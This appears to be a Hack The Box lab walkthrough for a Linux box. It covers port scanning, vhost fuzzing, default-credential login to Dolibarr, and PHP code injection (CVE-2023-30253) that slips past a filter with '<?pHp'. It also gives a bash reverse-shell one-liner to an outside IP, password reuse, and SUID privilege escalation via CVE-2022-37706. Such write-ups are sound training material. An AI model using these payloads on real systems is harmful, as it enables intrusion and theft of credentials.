---
date: 2024-09-29
categories: [Linux, Easy]
---

![Logo](https://github.com/user-attachments/assets/997ea495-b7d7-49e5-83fe-5747fa781fbe)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [cY83rR0H1t](https://app.hackthebox.com/users/116842)         | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---









- I start with a scan of the open ports,
    
    ```bash
    nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.11 -oG scan
    ```
    
    ![image](https://github.com/user-attachments/assets/847f9aac-35ba-483a-a1ff-a1f17d892d4d)

    
- Scanning open ports.
    
    ```bash
    nmap -p22,80 -sCV 10.10.11.11 -oN ports
    ```
    
    ![image 1](https://github.com/user-attachments/assets/4af6c432-5608-4d56-b5ca-ce6d1d162183)

    
- I look at what technologies they are using on the website. I found a path with this acknowledgement and added it to the `/etc/hosts` file
    
    ```bash
    whatweb http://10.10.11.11
    ```
    
    ![image 2](https://github.com/user-attachments/assets/3f40d9c0-17f0-4c0b-b3d6-7d4999b0250b)

    
    ![image 3](https://github.com/user-attachments/assets/a1a16ad8-6a53-4258-806e-8b7063887c59)

    

- After searching for a while through the site and the routes discovered with gobuster I can't find anything relevant. When searching for virtual host I find one, `crm`
    
    ```bash
    wfuzz -c -t 200 --hh=15949 -w /usr/share/amass/wordlist/subdomains-top1mil-110000.txt -H "Host: FUZZ.board.htb" http://board.htb
    ```
    
    ![image 4](https://github.com/user-attachments/assets/136c7374-9ecf-4c64-9931-df865cd0cff1)

    

- I add it to the /etc/hosts file and enter the site
    
    ![image 5](https://github.com/user-attachments/assets/1022eef5-74b8-4ed5-a082-df4ef70f3972)

    

- I search for the default credentials `admin`:`admin` and get access.
    
    ![image 6](https://github.com/user-attachments/assets/f84e9d4c-a5e3-448c-9659-f6ac6f6143dc)

    
- When looking for vulnerabilities of this version I find the CVE-2023-30253 that consists in creating a website and a page to which we can add php code. This has a validation that does not allow us to introduce the string “php” but when we put it in the following way if it allows us.
    
    [Security Advisory: Dolibarr 17.0.0 PHP Code Injection (CVE-2023-30253) - Swascan](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)
    
- We add a piece of code to create a reverse shell and we enter to see the page that we have just created to execute our code.
    
    ```bash
    <?pHp
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.205/4242 0>&1'");
    ?>
    ```
    
    ![image 7](https://github.com/user-attachments/assets/a198ee8c-4795-42ba-8bdb-cd93643ee12d)

    
- I start listening on port 4242 and I get a shell
    
    ```bash
    nc -nlvp 4242
    ```
    
    ![image 8](https://github.com/user-attachments/assets/61e1c3de-c498-49e3-b457-dcfa01c6a673)

    
- I search the Dolibarr configuration file and find some mysql credentials.
    
    ![image 9](https://github.com/user-attachments/assets/bba71c30-76de-44c2-8d2e-0b2d864c6c8f)

    
- I try to reuse the password found with the user `larissa` that I find by looking at the `/etc/passwd` file.
    
    ![image 10](https://github.com/user-attachments/assets/9e28d658-97cb-459a-9960-bc46f729bf71)

    
- Searching for suid permissions I find some unusual files and running leanpeas confirms my suspicions. The enlightenment files with versions prior to 0.25.4 have a vulnerability listed in `CVE-2022-37706`.
    
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    
    ![image 11](https://github.com/user-attachments/assets/7424bc86-2196-487d-8ca9-310a94dd7e42)

    
    ![image 12](https://github.com/user-attachments/assets/7fd9cefb-a033-4ce7-abd2-67ce911e2cb4)

    
- I find a POC of this CVE and by executing it I manage to escalate my privileges and become root
    
    [CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
    
    ![image 13](https://github.com/user-attachments/assets/5b67c560-7461-48e8-a39c-ce984ba199be)
